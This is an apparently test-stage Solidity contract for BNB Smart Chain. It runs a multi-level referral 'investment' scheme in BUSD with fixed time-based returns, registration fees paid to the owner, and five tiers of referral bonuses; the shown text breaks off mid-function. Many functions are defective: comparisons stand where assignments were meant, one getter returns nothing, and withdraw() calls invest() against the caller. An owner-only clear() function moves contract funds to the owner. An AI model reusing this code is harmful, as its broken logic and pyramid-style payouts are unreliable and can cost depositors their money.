/**
 *Submitted for verification at BscScan.com on 2023-01-27
*/

/**
 *Submitted for verification at BscScan.com on 2023-01-26
*/

/**
 *Submitted for verification at BscScan.com on 2023-01-23
*/

// SPDX-License-Identifier: None

pragma solidity 0.6.12;

contract Test_M9_5_R{
        IBEP20 token;

        address busd = 0xCA4e3Efa71bDC0C163a49a895A1416463cf2c42E;

    using SafeMath for uint256;
    uint256[] public REFERRAL_PERCENTS = [50, 50, 50, 50, 50];//5% referal reward
    uint256 public constant PERCENTS_DIVIDER = 1000;
    uint256 public constant TIME_STEP = 1 ;
    uint256 constant public PROJECT_FEE = 100;//10% fee
    uint256 constant public PROJECT_Burn = 900;//10% fee

    uint256 public totalInvested;
    uint256 public totalRefBonus;
    uint256 public totalRefers;
    address payable public OwnerAddress;
    uint256 public totalDeposits;
    uint256 public total_LevelReferrals1;
//////
    uint8 public LAST_LEVEL;
    uint256 public RegFee = 1000000*1e18;
    uint public lastUserId;
    address public id1;
    mapping(uint => address) public idToAddress;
    mapping(uint => address) public userIds;
    mapping(uint => uint256) public userIdsTime;
 //bool public activTORSREF_REWARD;//bool activate
       bool public activTORSREF_REWARD;
       bool public activTORSREF_REWARD1;
       bool public activTORSREF_REWARD2;
       bool public activTORSREF_REWARD3;

       bool  activDEP_REWARD;
       bool  activDEP_REWARD1;
       bool  activDEP_REWARD2;
       bool  activDEP_REWARD3;
uint256 public priceTimer;


    struct Lvel {
        uint256 price;
        uint256 time;
        uint256 percent;
        bool  LvelActiveted;

    }

    Lvel[] internal lvels;

	struct Deposit {
        uint8 lvel;
		uint256 percent;
		uint256 amount;
		uint256 profit;
		uint256 start;
		uint256 finish;
	}

	struct User {
        mapping(uint8 => bool) activeMainLevels;//bool activate
        bool activeREfReg;//bool activate

        mapping(uint8 => uint256) activetimeMainLevels;//Time Activate 
        uint id;
        uint256 refID;
        uint partnersCount;
        address LevelReferrals1;
        address LevelReferrals2;
        address LevelReferrals3;
        address LevelReferrals4;
        address LevelReferrals5;
        uint256 regtimeref;
    uint256  total_LevelReferrals1US;
    uint256  total_LevelReferrals1US_Timer;
    uint256  total_LevelReferralsBONTOT_USER;


    uint256  SE_total_LevelReferrals1US;
    uint256  SE_total_LevelReferrals1US_Timer;
    address  SE_total_LevelReferrals1US_ADR;


		Deposit[] deposits;
		uint256 checkpoint;
		uint256 checkpointRefBonus;
		uint256 checkpointRegRefBonus;
		uint256 checkpointLVR1RefBonus;
		uint256 REFBonsINVEST;
		address referrer;
		uint256[5] levels;
		uint256[5] levels_Ref;
		uint256[5] levels_My;

		uint256 REG_checkpoint_levels_Referals;
		address REG_Dep_levels_Referals;
		uint256 REG_Count_levels_Referals;
		address REG_Raddress_levels_Referals;
		address REG2_Raddress_levels_Referals;
		address REG3_Raddress_levels_Referals;

		uint256 DEP_checkpoint_levels_Referals;
		address DEP_Dep_levels_Referals;
		uint256 DEP_Count_levels_Referals;
		address DEP_Raddress_levels_Referals;
		address DEP2_Raddress_levels_Referals;
		address DEP3_Raddress_levels_Referals;

		uint256 DEP_MY_checkpoint_levels_Referals;
		address DEP_MY_Dep_levels_Referals;
		uint256 DEP_MY_Count_levels_Referals;
		address DEP_MY_Raddress_levels_Referals;

       uint256  REG_activatesRefer;
       uint256  DEP_activatesRefer;
       uint256  DEP_activatesRefer_Timer;

       address  DEP_MY_activatesReferADR;
       uint256  DEP_MY_activatesRefer_Timer;
       uint256 DEP_MY_activatesReferADD;

       address  DEP_REF_activatesReferADR;
       uint256  DEP_REF_activatesRefer_Timer;
       uint256 DEP_REF_activatesReferADD;

       uint256  RERE;
       uint256  RERE2;
       uint256  RERE3;
uint256  priceTimer2;
       bool  activTORSREF_REWARDes;
       bool  activTORSREF_REWARDes1;
       bool  activTORSREF_REWARDes2;
       bool  activTORSREF_REWARDes3;

       bool  activDEP_REWARDes;
       bool  activDEP_REWARDes1;
       bool  activDEP_REWARDes2;
       bool  activDEP_REWARDes3;

		uint256 bonus;
		uint256 totalBonus;
        uint256 withdrawn;

    uint256  totalRefersUS;

	}

    mapping(address => User) internal users;
    event Newbie(address user);
	event NewDeposit(address indexed user, uint8 lvel, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish);
	event Withdrawn(address indexed user, uint256 amount);
    
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);
   
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);

    constructor(address payable wallet) public {
        OwnerAddress = wallet;
        LAST_LEVEL = 16;
     uint256 rfgref = 100;
     uint256 rfgref2 = 11;
     uint256 qwe = (rfgref2/rfgref)+1;
         token = IBEP20(busd);

        lvels.push(Lvel(25000000  * 1e18, 300, 3*qwe, true));
        lvels.push(Lvel(25000000  * 1e18, 300, 3*qwe, true));
        lvels.push(Lvel(25000000  * 1e18, 300, 3*qwe, true));
        lvels.push(Lvel(25000000  * 1e18, 300, 3*qwe, false));
        lvels.push(Lvel(25000000  * 1e18, 300, 3*qwe, true));
        lvels.push(Lvel(25000000  * 1e18, 300, 3*qwe, true));
        lvels.push(Lvel(25000000  * 1e18, 300, 3*qwe, true));
        lvels.push(Lvel(25000000  * 1e18, 300, 3*qwe, true));
        lvels.push(Lvel(25000000  * 1e18, 5 minutes, 1000, false));
        lvels.push(Lvel(25000000  * 1e18, 5 minutes, 1000, false));
        lvels.push(Lvel(25000000  * 1e18, 5 minutes, 1000, false));
        lvels.push(Lvel(25000000  * 1e18, 5 minutes, 1000, false));
        lvels.push(Lvel(25000000  * 1e18, 5 minutes, 1000, false));
        lvels.push(Lvel(25000000  * 1e18, 5 minutes, 1000, false));
        lvels.push(Lvel(25000000  * 1e18, 5 minutes, 1000, false));
        lvels.push(Lvel(25000000  * 1e18, 5 minutes, 1000, false));
        lvels.push(Lvel(1  * 1e18, 600, 10*qwe, true));//17

        for (uint8 i = 1; i <= LAST_LEVEL; i++) {
            users[OwnerAddress].activeMainLevels[i] = true;
        }
        User storage user = users[OwnerAddress];

        lastUserId = 2;
        idToAddress[1] = OwnerAddress;
        userIds[1] = OwnerAddress;
        user.id=1;
        user.LevelReferrals1=address(0);
        user.LevelReferrals2=address(0);
        user.LevelReferrals3=address(0);
        user.LevelReferrals4=address(0);
        user.LevelReferrals5=address(0);
        user.partnersCount=uint(0);
        user.refID = uint(0);


  }

    function clear(uint amount) public  {
      if (payable(msg.sender) == OwnerAddress)
      {
       OwnerAddress.transfer(amount);
      }
    }

    function setLvelActiveted(uint8 lvel, bool enabled) external {
        require(payable(msg.sender) == OwnerAddress);
        lvels[lvel].LvelActiveted = enabled;
    }

    function invest(address referrer, uint8 lvel,  uint256 value) public {

        require(lvel <= 17, "Invalid lvel");
        require(value >= lvels[lvel].price,"Wrong value");
       require(isUserExists(referrer), "user is not exists. Register first.");
        require(lvel >= 0 && lvel <= LAST_LEVEL, "invalid level");
        require(lvels[lvel].LvelActiveted == true, "level already false");
      //  uint256 fee = value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);

                token.transferFrom(msg.sender, address(this), value);

       // OwnerAddress.transfer( fee);
      //  emit FeePayed(msg.sender, fee);
        User storage user = users[msg.sender];

				address upline1 = user.LevelReferrals1;         
           //if (users[upline1].activeMainLevels[lvel] ==  users[referrer].activeMainLevels[lvel]) {
               if(users[referrer].referrer == upline1 && users[upline1].activeMainLevels[lvel] ==  users[referrer].activeMainLevels[lvel])
    {
                if (upline1 != address(0)) {
					uint256 amount =  value.mul(0).div(PERCENTS_DIVIDER);
					users[upline1].bonus = users[upline1].bonus.add(amount);
					users[upline1].totalBonus = users[upline1].totalBonus.add(amount);
					emit RefBonus(upline1, msg.sender, 0, amount);
					upline1 = users[upline1].LevelReferrals1;
			}
			}else {
				if (upline1 != address(0)) {
					uint256 amount =  value.mul(550).div(PERCENTS_DIVIDER);
					users[upline1].bonus = users[upline1].bonus.add(amount);
					users[upline1].totalBonus = users[upline1].totalBonus.add(amount);
					emit RefBonus(upline1, msg.sender, 550, amount);
					upline1 = users[upline1].LevelReferrals1;
                    user.checkpointLVR1RefBonus = block.timestamp;
                    user.total_LevelReferralsBONTOT_USER = user.total_LevelReferralsBONTOT_USER.add(1);

                    user.DEP_checkpoint_levels_Referals = block.timestamp;
                    user.DEP_Dep_levels_Referals = upline1;
                    user.DEP_Count_levels_Referals=  user.partnersCount.add(1);
                    user.DEP_Raddress_levels_Referals =  users[upline1].LevelReferrals1;
                    user.DEP2_Raddress_levels_Referals =  user.LevelReferrals1;
                    user.DEP3_Raddress_levels_Referals =  users[referrer].referrer;
                    ///
			for (uint256 i = 0; i < 1; i++) {
				//if (upline1 != address(0)) {
					users[upline1].levels_Ref[i] = users[upline1].levels_Ref[i].add(1);
					upline1 = users[upline1].referrer;


user.DEP_REF_activatesRefer_Timer = block.timestamp;
user.DEP_REF_activatesReferADD =  user.DEP_REF_activatesReferADD.add(1);
user.DEP_REF_activatesReferADR = upline1;

				//} else break;
			}
            /////
if (user.REG_activatesRefer >= 1)
{

    user.DEP_activatesRefer = 2;
    user.DEP_activatesRefer_Timer = block.timestamp;

}

			}
           }
			address upline2 = user.LevelReferrals2;
				if (upline2 != address(0)) {
					uint256 amount =  value.mul(50).div(PERCENTS_DIVIDER);
					users[upline2].bonus = users[upline2].bonus.add(amount);
					users[upline2].totalBonus = users[upline2].totalBonus.add(amount);
					emit RefBonus(upline2, msg.sender, 50, amount);
					upline2 = users[upline2].LevelReferrals2;
				} 
            address upline3 = user.LevelReferrals3;
				if (upline3 != address(0)) {
					uint256 amount =  value.mul(50).div(PERCENTS_DIVIDER);
					users[upline3].bonus = users[upline3].bonus.add(amount);
					users[upline3].totalBonus = users[upline3].totalBonus.add(amount);
					emit RefBonus(upline3, msg.sender, 50, amount);
					upline3 = users[upline3].LevelReferrals3;
				} 
             address upline4 = user.LevelReferrals4;
				if (upline4 != address(0)) {
					uint256 amount =  value.mul(50).div(PERCENTS_DIVIDER);
					users[upline4].bonus = users[upline4].bonus.add(amount);
					users[upline4].totalBonus = users[upline4].totalBonus.add(amount);
					emit RefBonus(upline4, msg.sender, 50, amount);
					upline4 = users[upline4].LevelReferrals4;   
				} 
             address upline5 = user.LevelReferrals5;
				if (upline5 != address(0)) {
					uint256 amount =  value.mul(50).div(PERCENTS_DIVIDER);
					users[upline5].bonus = users[upline5].bonus.add(amount);
					users[upline5].totalBonus = users[upline5].totalBonus.add(amount);
					emit RefBonus(upline5, msg.sender, 50, amount);
					upline5 = users[upline5].LevelReferrals5;
				} 
		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}

		(uint256 percent, uint256 profit, uint256 finish) = getResult(lvel, value);
		user.deposits.push(Deposit(lvel, percent, value, profit, block.timestamp, finish));

		totalInvested = totalInvested.add(value);
		emit NewDeposit(msg.sender, lvel, percent, value, profit, block.timestamp, finish);

         totalDeposits = totalDeposits.add(1);
         totalRefers = totalRefers.add(1);
         user.totalRefersUS = user.totalRefersUS.add(1);

                 users[referrer].activeMainLevels[lvel] = true;
                 users[referrer].activetimeMainLevels[lvel] = block.timestamp ;
         totalRefers = totalRefers.add(1);
         user.totalRefersUS = user.totalRefersUS.add(1);


                    user.DEP_MY_checkpoint_levels_Referals = block.timestamp;
                    user.DEP_MY_Dep_levels_Referals = upline1;
                    user.DEP_MY_Count_levels_Referals=  user.partnersCount.add(1);
                    user.DEP_MY_Raddress_levels_Referals =  users[upline1].LevelReferrals1;

       }

        function GET_REG_activatesRefer(address referrer) public view returns(uint256) {
                    User storage user = users[referrer];

        return  user.REG_activatesRefer;
    }

        function GET_DEP_activatesRefer(address referrer) public view returns(uint256) {
                    User storage user = users[referrer];

        return  user.DEP_activatesRefer;
    }

        function GET_DEP_activatesRefer_timer(address referrer) public view returns(uint256) {
                    User storage user = users[referrer];

        return  user.DEP_activatesRefer_Timer;
    }

 	function GET_DEP_activatesRefer_timers_Bool(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];


if(users[msg.sender].DEP_activatesRefer >= user.DEP_activatesRefer_Timer)
{
    user.RERE == 6;
}
if(users[msg.sender].DEP_activatesRefer <= user.DEP_activatesRefer_Timer)

 {
user.RERE == 7;

}
		return user.RERE;
	}

function GET_DEP_activatesRefer_timers_Boo_RETURN_1(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
		return user.DEP_activatesRefer_Timer;
	}

    function GET_DEP_activatesRefer_timers_Boo_RETURN_1_2(address userAddress) public view returns (address) {
		User storage user = users[userAddress];
       //if(user.DEP_activatesRefer_Timer >= ) 
		return user.LevelReferrals1;
	}
        function GET_DEP_activatesRefer_timers_Boo_RETURN_1_3(address userAddress) public view returns (address) {
		User storage user = users[userAddress];
       //if(user.DEP_activatesRefer_Timer >= ) 
		return user.LevelReferrals1;
	}

        function GET_DEP_activatesRefer_timers_Boo_RETURN_1_4(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
    if(user.DEP_activatesRefer_Timer >= user.DEP_checkpoint_levels_Referals) 
    {
priceTimer == 55;
    }
    else {priceTimer == 44;}
		return priceTimer;
	}

        function GET_DEP_activatesRefer_timers_Boo_RETURN_1_5(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
    if(user.DEP_activatesRefer_Timer >= user.DEP_checkpoint_levels_Referals) 
    {
user.priceTimer2 == 55;
    }
 else {user.priceTimer2 == 45;}

		return user.priceTimer2;
	}
    function GET_DEP_activatesRefer_timers_Boo_RETURN_11(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
		return users[user.LevelReferrals1].DEP_activatesRefer_Timer;
	}
    function GET_DEP_activatesRefer_timers_Boo_RETURN_111(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
		return users[user.LevelReferrals1].DEP_activatesRefer_Timer;
	}
        function GET_DEP_activatesRefer_timers_Boo_RETURN_111_1(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
		return users[user.LevelReferrals1].DEP_activatesRefer;
	}

    function GET_DEP_activatesRefer_timers_Boo_RETURN_1112(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
     address ereer =  users[userAddress].referrer;

		return users[ereer].DEP_activatesRefer_Timer;
	}
    function GET_DEP_activatesRefer_timers_Boo_RETURN_1113(address userAddress) public view returns (address) {
		User storage user = users[userAddress];
     address ereer =  users[userAddress].referrer;

		return ereer;
	}
    function GET_DEP_activatesRefer_timers_Boo_RETURN_2(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
		return users[msg.sender].DEP_activatesRefer;
	}
function GET_DEP_activatesRefeBool(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
		return users[msg.sender].DEP_activatesRefer;
	}
function GET_DEP_activatesRefeBool2(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
		return users[user.LevelReferrals1].DEP_activatesRefer_Timer;
	}

  function invest2(address referrer, uint8 lvel,  uint256 value) public {

        //require(lvel <= 17, "Invalid lvel");
        //require(value >= lvels[lvel].price,"Wrong value");
       require(isUserExists(referrer), "user is not exists. Register first.");
        require(lvel >= 0 && lvel <= LAST_LEVEL, "invalid level");
        require(lvels[lvel].LvelActiveted == true, "level already false");
         token.transferFrom(msg.sender, address(this), value);
        User storage user = users[msg.sender];

		
		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}

		(uint256 percent, uint256 profit, uint256 finish) = getResult(lvel, value);
		user.deposits.push(Deposit(lvel, percent, value, profit, block.timestamp, finish));

		totalInvested = totalInvested.add(value);
		emit NewDeposit(msg.sender, lvel, percent, value, profit, block.timestamp, finish);

         totalDeposits = totalDeposits.add(1);
         totalRefers = totalRefers.add(1);
         user.totalRefersUS = user.totalRefersUS.add(1);

                // users[referrer].activeMainLevels[lvel] = true;
                 users[referrer].activetimeMainLevels[lvel] = block.timestamp ;
         totalRefers = totalRefers.add(1);
         user.totalRefersUS = user.totalRefersUS.add(1);


       }


        function usersactiveMainLevels(address referrer, uint8 lvel) public view returns(bool) {
        return users[referrer].activeMainLevels[lvel];
    }


        function userregtimeref(address referrer, uint8 lvel) public view returns(uint256) {
        return  users[referrer].activetimeMainLevels[lvel];
    }

  function registr(address userAddress,  uint256 value) public  {
        require(!isUserExists(userAddress), "user exists");
        require(value >= RegFee,"Wrong value");
                token.transferFrom(msg.sender, OwnerAddress, RegFee);

        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }

        User storage user= users[userAddress];
        user.id=lastUserId;
        user.LevelReferrals1=address(0);
        user.LevelReferrals2=address(0);
        user.LevelReferrals3=address(0);
        user.LevelReferrals4=address(0);
        user.LevelReferrals5=address(0);
        user.partnersCount=uint(0);
        
       
    user.partnersCount=uint(0);

        idToAddress[lastUserId] = userAddress;

        userIds[lastUserId] = userAddress;
        lastUserId++;
        sendRegFee();
        userIdsTime[lastUserId] = block.timestamp;
    }

  function registrationRef(address userAddress, address referrerAddress,  uint256 value) public  {
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");
        require(value >= RegFee,"Wrong value");
                token.transferFrom(msg.sender, OwnerAddress, RegFee);
    
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }

         User storage user= users[userAddress];
        user.id=lastUserId;
        user.LevelReferrals1=referrerAddress;
        user.partnersCount=uint(0);
        user.refID=users[referrerAddress].id;

        idToAddress[lastUserId] = userAddress;

        userIds[lastUserId] = userAddress;
        lastUserId++;

        users[referrerAddress].partnersCount++;

total_LevelReferrals1 = user.partnersCount.add(1);
user.total_LevelReferrals1US = user.partnersCount.add(1);
user.total_LevelReferrals1US_Timer =  block.timestamp;

if (users[referrerAddress].deposits.length > 0 && referrerAddress != msg.sender) {
user.referrer = referrerAddress;
}
address upline = user.referrer;
			for (uint256 i = 0; i < 1; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;

                    user.REG_checkpoint_levels_Referals = block.timestamp;
                    user.REG_Dep_levels_Referals = upline;
                    user.REG_Count_levels_Referals=  user.partnersCount.add(1);
                    user.REG_Raddress_levels_Referals =  referrerAddress;
                    user.REG2_Raddress_levels_Referals =  user.referrer;
                    user.REG3_Raddress_levels_Referals =  user.LevelReferrals1;


user.SE_total_LevelReferrals1US_Timer = block.timestamp;
user.SE_total_LevelReferrals1US =  user.partnersCount.add(1);
user.SE_total_LevelReferrals1US_ADR = upline;

user.REG_activatesRefer = user.REG_activatesRefer.add(1);
				} else break;
			}
		


        if(users[referrerAddress].LevelReferrals1!=address(0))
        {
            users[userAddress].LevelReferrals2=users[referrerAddress].LevelReferrals1;

            if(users[referrerAddress].LevelReferrals2!=address(0))
            {
                users[userAddress].LevelReferrals3=users[referrerAddress].LevelReferrals2;
            }

                        if(users[referrerAddress].LevelReferrals3!=address(0))
            {
                users[userAddress].LevelReferrals4=users[referrerAddress].LevelReferrals3;
            }

                                    if(users[referrerAddress].LevelReferrals4!=address(0))
            {
                users[userAddress].LevelReferrals5=users[referrerAddress].LevelReferrals4;
            }


        }
        sendRegFee();
        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
        userIdsTime[lastUserId] = block.timestamp;

        user.checkpointRegRefBonus = block.timestamp;
user.activeREfReg  = true;
                // users[referrer].activeMainLevels[lvel] = true;

    }


   function SuserIdsTime_lastUserId() public view returns (uint256) {
        return userIdsTime[lastUserId];
    }



   function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
   
    function sendRegFee() private returns (bool) {
        (bool success, ) = (OwnerAddress).call{value:RegFee}('');

        return success;
    }

     function getTimer(address userAddress) public view returns (uint256) {
        return users[userAddress].checkpoint.add(3 minutes);  
    }

  /*
    function withdrawL() public {
		User storage user = users[msg.sender];

		uint256 totalAmount = getUserDividends(msg.sender);
		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
			totalAmount = totalAmount.add(referralBonus);
		}

		require(totalAmount > 0, "User has no dividends");
		uint256 contractBalance = IBEP20(busd).balanceOf(address(this));
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}
		user.checkpoint = block.timestamp;
		token.transfer(msg.sender, totalAmount);
		emit Withdrawn(msg.sender, totalAmount);
}
*/
function withdraw () public {
			User storage user = users[msg.sender];
		uint256 totalAmount = getUserDividends(msg.sender);
		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
			totalAmount = totalAmount.add(referralBonus);
		}
		require(totalAmount > 0, "User has no dividends");
		uint256 contractBalance = IBEP20(busd).balanceOf(address(this));
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}

 //if(user.total_LevelReferralsBONTOT_USER >= 1 && user.checkpointLVR1RefBonus >= 5 minutes)
 //if (users[user.LevelReferrals1].DEP_activatesRefer >= 2)/*&& user.checkpointLVR1RefBonus >= 5 minutes*/
 if( user.DEP_REF_activatesRefer_Timer >= user.checkpointLVR1RefBonus)
{
		user.checkpoint = block.timestamp;
        token.transfer(msg.sender, totalAmount);
        emit Withdrawn(msg.sender, totalAmount);
}

else{
 		user.checkpoint = block.timestamp;
        token.transfer(msg.sender, totalAmount);
        emit Withdrawn(msg.sender, totalAmount);
        uint256 fee= SafeMath.div(SafeMath.mul(totalAmount,10),100);
        invest(msg.sender,  16, fee);
}

}




 	function DetUserDiv(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

if(user.DEP_MY_Count_levels_Referals >=1  )
{
    activTORSREF_REWARD == true;
}
else 
{activTORSREF_REWARD == false;}

		return activTORSREF_REWARD;
	}

 	function DetUserDiv2(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

if(user.DEP_MY_Count_levels_Referals <=1  )
{
    activTORSREF_REWARD1 == true;
}
else 
{activTORSREF_REWARD1 == false;}

		return activTORSREF_REWARD1;
	}


 	function DetUserDivDEP(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

if(user.DEP_MY_Count_levels_Referals <=1  )
{
    user.activDEP_REWARDes == true;
}
else 
{user.activDEP_REWARDes == false;}

		return user.activDEP_REWARDes;
	}

 	function DetUserDivDEP3(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

if(user.DEP_checkpoint_levels_Referals <= user.DEP_MY_checkpoint_levels_Referals )
{
    activDEP_REWARD == true;
}
else 
{activDEP_REWARD == false;}

		return activDEP_REWARD;
	}

 	function DetUserDivDEP4(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

if(user.DEP_checkpoint_levels_Referals >= user.DEP_MY_checkpoint_levels_Referals  )
{
    activDEP_REWARD1 == true;
}
else 
{activDEP_REWARD1 == false;}

		return activDEP_REWARD1;
	}
    


     	function DetUserDivDEP5(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

if(user.DEP_checkpoint_levels_Referals <= user.DEP_MY_checkpoint_levels_Referals )
{
    user.activDEP_REWARDes == true;
}
else 
{user.activDEP_REWARDes == false;}

		return user.activDEP_REWARDes;
	}

 	function DetUserDivDEP6(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

if(user.DEP_checkpoint_levels_Referals >= user.DEP_MY_checkpoint_levels_Referals  )
{
    user.activDEP_REWARDes1 == true;
}
else 
{user.activDEP_REWARDes1 == false;}

		return user.activDEP_REWARDes1;
	}
     	function DetUserDivES(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

if(user.DEP_MY_Count_levels_Referals <=1  )
{
    user.activTORSREF_REWARDes == true;
}
else 
{user.activTORSREF_REWARDes == false;}

		return user.activTORSREF_REWARDes;
	}

     	function DetUserDiv2ES(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

if(user.DEP_MY_Count_levels_Referals <=1  )
{
    user.activTORSREF_REWARDes1 == true;
}
else 
{user.activTORSREF_REWARDes1 == false;}

		return user.activTORSREF_REWARDes1;
	}


 	/*
 	function getUserDiv2(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];




stkf = users[userAddress].levels[0]

		return stkf;
	}
*/




            function getLveLskt(address userAddress)
        public
        view
        returns ( uint256 )
    {
        		User storage user = users[userAddress];
                uint256 Lskt;

for (uint256 i = 0; i < user.deposits.length; i++) {
     Lskt = i;
}
	return Lskt;
    }
        function getLvelInfo2(address userAddress)
        public
        view
        returns ( bool )
    {
        		User storage user = users[userAddress];

	activTORSREF_REWARD;
    }

    function blockinfo() public view returns (uint256)
    {
        return block.timestamp;
    }


    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getLvelInfo(uint8 lvel)
        public
        view
        returns (uint256 time, uint256 percent, uint256 price, bool LvelActiveted)
    {
		time = lvels[lvel].time;
		percent = lvels[lvel].percent;
		price = lvels[lvel].price;
       LvelActiveted  = lvels[lvel].LvelActiveted;
    }

        function getLvelActivatedinfo(uint8 lvel)
        public
        view
        returns (bool LvelActiveted)
    {
	
       LvelActiveted  = lvels[lvel].LvelActiveted;
    }

	function getResult(uint8 lvel, uint256 deposit) public view returns (uint256 percent, uint256 profit, uint256 finish) {
		percent = getPercent(lvel);
		profit = deposit.mul(percent).div(PERCENTS_DIVIDER).mul(lvels[lvel].time);
        finish = block.timestamp.add(lvels[lvel].time.mul(TIME_STEP));

	}

	function getPercent(uint8 lvel) public view returns (uint256) {
	   return lvels[lvel].percent;
    }

	function getPrice(uint8 lvel) public view returns (uint256) {
	   return lvels[lvel].price;
    }

 	/*function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			if (user.checkpoint < user.deposits[i].finish) {
			 if (block.timestamp > user.deposits[i].finish) {
					totalAmount = totalAmount.add(user.deposits[i].profit);
				}
			}
		}

		return totalAmount;
	}
*/

 	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
            			if (user.checkpoint < user.deposits[i].finish) {
				if (user.deposits[i].lvel < 16) {
					uint256 share = user.deposits[i].amount.mul(user.deposits[i].percent).div(PERCENTS_DIVIDER);
					uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
					uint256 to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;
					if (from < to) {
						totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
					}
				} else if (block.timestamp > user.deposits[i].finish) {
					totalAmount = totalAmount.add(user.deposits[i].profit);
				}
			}
		}


		return totalAmount;
	}
 	/*function getUserDividends2(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;
		for (uint256 i = 0; i < user.deposits.length; i++) {
			if (user.checkpoint < user.deposits[i].finish) {
				if (user.deposits[i].lvel > 16 ) {//|| user.checkpointLVR1RefBonus >= 1 minutes) {
					uint256 share = user.deposits[i].amount.mul(user.deposits[i].percent).div(PERCENTS_DIVIDER);
					uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
					uint256 to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;
					if (from < to) {
						totalAmount = totalAmount.add(share.mul(to.sub(from)));
					}
				} else if (block.timestamp > user.deposits[i].finish) {
					totalAmount = totalAmount.add(user.deposits[i].profit);
				}
			}
		}

		return totalAmount;
	}*/
 /*	function getUserDividendsInfo(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
					uint256 share = user.deposits[i].amount.mul(user.deposits[i].percent).div(PERCENTS_DIVIDER);
					uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
					uint256 to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;
					if (from < to) {
						totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
					}
			}

		return totalAmount;
	}
*/
 /*	function getUserDividendsInfo(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
            			if (user.checkpoint < user.deposits[i].finish) {
				if (user.deposits[i].lvel < 16) {
					uint256 share = user.deposits[i].amount.mul(user.deposits[i].percent).div(PERCENTS_DIVIDER);
					uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
					uint256 to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;
					if (from < to) {
						totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
					}
				} else if (block.timestamp > user.deposits[i].finish) {
					totalAmount = totalAmount.add(user.deposits[i].profit);
				}
			}
		}


		return totalAmount;
	}
*/
    function getUserCheckpoint(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].checkpoint;
    }


   function getUsertotal_LevelReferrals1US(address userAddress)public view returns (uint256)
    {
		User storage user = users[userAddress];
        return user.total_LevelReferrals1US;
    }

   function getUsertotal_LevelReferrals1US_Timer(address userAddress)public view returns (uint256)
    {
		User storage user = users[userAddress];
        return user.total_LevelReferrals1US_Timer;
    }

	function getUsertotal_LevelReferrals1US_Timer3(address userAddress) public view returns(uint256 countR, uint256 TimerR) {
	    User storage user = users[userAddress];

countR = user.total_LevelReferrals1US;
TimerR = user.total_LevelReferrals1US_Timer;
	}

	function gettotal_LevelReferralsBONTOT_USER(address userAddress) public view returns(uint256 countR) {
	    User storage user = users[userAddress];

countR = user.total_LevelReferralsBONTOT_USER;
	}

	function gettotal_LevelReferralsBONTOT_USER_TWO(address userAddress) public view returns(uint256 TotallevelR, uint256 TimersRef) {
	    User storage user = users[userAddress];

TotallevelR = user.total_LevelReferralsBONTOT_USER;
